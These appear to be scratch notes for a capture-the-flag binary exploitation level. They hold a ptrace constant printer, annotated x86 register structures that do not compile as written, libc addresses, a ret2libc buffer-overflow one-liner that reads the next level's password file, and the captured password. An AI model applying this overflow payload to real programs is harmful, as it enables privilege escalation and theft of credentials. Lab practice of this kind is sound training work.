#include <sys/ptrace.h>
#include <stdio.h>

int main (void)
{
    printf("PTRACE_TRACEME : %d\n", PTRACE_TRACEME);
    printf("PTRACE_PEEKTEXT : %d\n", PTRACE_PEEKTEXT);
    printf("PTRACE_PEEKDATA : %d\n", PTRACE_PEEKDATA);
    printf("PTRACE_PEEKUSER : %d\n", PTRACE_PEEKUSER);
    printf("PTRACE_POKETEXT : %d\n", PTRACE_POKETEXT);
    printf("PTRACE_POKEDATA : %d\n", PTRACE_POKEDATA);
    printf("PTRACE_POKEUSER : %d\n", PTRACE_POKEUSER);
    printf("PTRACE_GETREGS : %d\n", PTRACE_GETREGS);
    printf("PTRACE_GETFPREGS : %d\n", PTRACE_GETFPREGS);
    printf("PTRACE_GETSIGINFO : %d\n", PTRACE_GETSIGINFO);
    printf("PTRACE_SETREGS : %d\n", PTRACE_SETREGS);
    printf("PTRACE_SETFPREGS : %d\n", PTRACE_SETFPREGS);
    printf("PTRACE_SETSIGINFO : %d\n", PTRACE_SETSIGINFO);
}i r



/* These are the 32-bit x86 structures.  */
struct user_fpregs_struct
{
  long int cwd;
  long int swd;
  long int twd;
  long int fip;
  long int fcs;
  long int foo;
  long int fos;
  long int st_space [20];
};

struct user_fpxregs_struct
{
  unsigned short int cwd;
  unsigned short int swd;
  unsigned short int twd;
  unsigned short int fop;
  long int fip;
  long int fcs;
  long int foo;
  long int fos;
  long int mxcsr;
  long int reserved;
  long int st_space[32];   /* 8*16 bytes for each FP-reg = 128 bytes */
  long int xmm_space[32];  /* 8*16 bytes for each XMM-reg = 128 bytes */
  long int padding[56];
};

struct user_regs_struct
{
  long int ebx; 0
  long int ecx; 4 
  long int edx; 8
  long int esi; 
  long int edi; 16
  long int ebp;
  long int eax; 24
  long int xds;
  long int xes; 32
  long int xfs;
  long int xgs; 40
  long int orig_eax; user+44
  long int eip;
  long int xcs;
  long int eflags;
  long int esp;
  long int xss;
};

struct user
{
  struct user_regs_struct       regs;
  int                           u_fpvalid;
  struct user_fpregs_struct     i387;
  unsigned long int             u_tsize;
  unsigned long int             u_dsize;
  unsigned long int             u_ssize;
  unsigned long int             start_code;
  unsigned long int             start_stack;
  long int                      signal;
  int                           reserved;
  struct user_regs_struct*      u_ar0;
  struct user_fpregs_struct*    u_fpstate;
  unsigned long int             magic;
  char                          u_comm [32];
  int                           u_debugreg [8];
};
#endif  /* __WORDSIZE */

#define PAGE_SIZE               (sysconf(_SC_PAGESIZE))
#define PAGE_MASK               (~(PAGE_SIZE-1))
#define NBPG                    PAGE_SIZE
#define UPAGES                  1
#define HOST_TEXT_START_ADDR    (u.start_code)
#define HOST_STACK_END_ADDR     (u.start_stack + u.u_ssize * NBPG)

#endif  /* _SYS_USER_H */









system   0xf7e6aed0
/bin/sh  0xf7f897ec


( python -c 'print("A" * 156 + "\xd0\xae\xe6\xf7" + "OSEF" + "\xec\x97\xf8\xf7")' ; echo "cat /home/users/level05/.pass" ) | ./level04

3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN